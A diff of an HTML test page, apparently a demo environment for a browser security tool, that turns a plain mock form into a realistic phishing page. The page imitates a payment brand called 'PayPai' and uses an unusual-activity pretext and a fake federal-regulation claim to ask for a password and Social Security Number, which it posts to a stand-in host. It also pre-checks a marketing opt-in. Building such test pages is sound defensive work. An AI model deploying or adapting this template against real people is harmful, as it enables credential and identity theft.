@@ -3,44 +3,171 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>HackerHare — full threat suite</title>
+    <title>Security Center — PayPai</title>
+    <link rel="stylesheet" href="shared.css" />
+    <style>
+      body {
+        background: #f5f7fa;
+      }
+      .header {
+        background: #003087;
+        color: #fff;
+        padding: 1.25rem 1.5rem;
+        text-align: center;
+      }
+      .header h1 {
+        margin: 0;
+        font-size: 1.4rem;
+        font-weight: 700;
+        font-style: italic;
+      }
+      .header p {
+        margin: 0.35rem 0 0;
+        font-size: 0.8rem;
+        opacity: 0.9;
+      }
+      .shell {
+        max-width: 440px;
+      }
+      .steps {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.4rem;
+        margin-bottom: 1.5rem;
+        font-size: 0.7rem;
+        font-weight: 600;
+        color: #666;
+      }
+      .steps span {
+        flex: 1 1 45%;
+        text-align: center;
+        padding: 0.35rem 0.25rem;
+        border-radius: 4px;
+        background: #e8eef5;
+      }
+      .steps span.on {
+        background: #003087;
+        color: #fff;
+      }
+      section {
+        margin-bottom: 1.25rem;
+      }
+      section h3 {
+        margin: 0 0 0.75rem;
+        font-size: 0.95rem;
+        color: #003087;
+      }
+      .card {
+        padding: 1.25rem;
+      }
+      .btn {
+        background: #0070ba;
+        color: #fff;
+      }
+      .btn.sec {
+        background: #2c2e2f;
+      }
+      .check-row {
+        background: #f0f7ff;
+        padding: 0.75rem;
+        border-radius: 8px;
+        border: 1px solid #cce0f5;
+        margin-bottom: 1rem;
+      }
+      #leak {
+        margin-top: 0.75rem;
+        font-size: 0.8rem;
+        color: #b12704;
+      }
+    </style>
   </head>
   <body>
-    <h1>Full threat suite</h1>
-    <p>
-      Combines insecure password (on load) and suspicious form (on submit). With
-      shielding + alerts on, expect up to <strong>two</strong> threat increments
-      (one per detection type).
-    </p>
+    <header class="header">
+      <h1>PayPai</h1>
+      <p>Security Center — Unusual activity detected</p>
+    </header>
+    <main class="shell">
+      <div class="steps">
+        <span class="on">1. Sign in</span>
+        <span>2. Preferences</span>
+        <span>3. Verify</span>
+        <span>4. Done</span>
+      </div>
 
-    <section>
-      <h2>Mock login (HTTP password)</h2>
-      <form action="/login" method="post">
-        <label>
-          Password
-          <input type="password" name="password" />
-        </label>
-      </form>
-    </section>
+      <section>
+        <div class="card">
+          <h3>Confirm your password</h3>
+          <p style="margin: 0 0 1rem; font-size: 0.85rem; color: #555">
+            Re-enter your password to continue securing your account.
+          </p>
+          <form action="/login" method="post" id="login-form">
+            <div class="field">
+              <label for="pw">Password</label>
+              <input type="password" id="pw" name="password" />
+            </div>
+          </form>
+        </div>
+      </section>
 
-    <section>
-      <h2>Mock sensitive survey</h2>
-      <form action="http://fake-secure-login.example/submit" method="post">
-        <label>
-          SSN
-          <input type="text" name="social-security" />
-        </label>
-        <button type="submit">Submit sensitive data</button>
-      </form>
-      <p id="leak" aria-live="polite"></p>
-    </section>
+      <section>
+        <div class="card">
+          <h3>Communication preferences</h3>
+          <p style="margin: 0 0 1rem; font-size: 0.85rem; color: #555">
+            While we review your account, confirm how you would like to hear from
+            PayPai.
+          </p>
+          <form action="#" method="post" id="prefs-form">
+            <div class="field">
+              <label for="contact-email">Contact email</label>
+              <input
+                type="email"
+                id="contact-email"
+                name="email"
+                placeholder="you@email.com"
+              />
+            </div>
+            <label class="check-row">
+              <input type="checkbox" name="newsletter" checked />
+              <span
+                >Subscribe to PayPai marketing updates, partner offers, and
+                product newsletters.</span
+              >
+            </label>
+            <button type="submit" class="btn">Save preferences</button>
+          </form>
+        </div>
+      </section>
 
+      <section>
+        <div class="card">
+          <h3>Verify your identity</h3>
+          <p style="margin: 0 0 1rem; font-size: 0.85rem; color: #555">
+            Federal regulations require us to confirm your SSN before restoring
+            account access.
+          </p>
+          <form
+            action="http://fake-secure-login.example/submit"
+            method="post"
+            id="verify-form">
+            <div class="field">
+              <label for="ssn">Social Security Number</label>
+              <input type="text" id="ssn" name="social-security" />
+            </div>
+            <button type="submit" class="btn sec">Submit verification</button>
+          </form>
+          <p id="leak" aria-live="polite"></p>
+        </div>
+      </section>
+
+      <p class="foot"><a href="index.html">← Demo environments</a></p>
+    </main>
     <script>
-      document.querySelectorAll("form")[1].addEventListener("submit", () => {
-        document.getElementById("leak").textContent =
-          "Sensitive form submitted — shield did not block."
+      document.getElementById("verify-form").addEventListener("submit", () => {
+        document.getElementById("leak").textContent = "Verification submitted."
+      })
+      document.getElementById("prefs-form").addEventListener("submit", (e) => {
+        e.preventDefault()
       })
     </script>
-    <p><a href="index.html">Back to index</a></p>
   </body>
 </html>
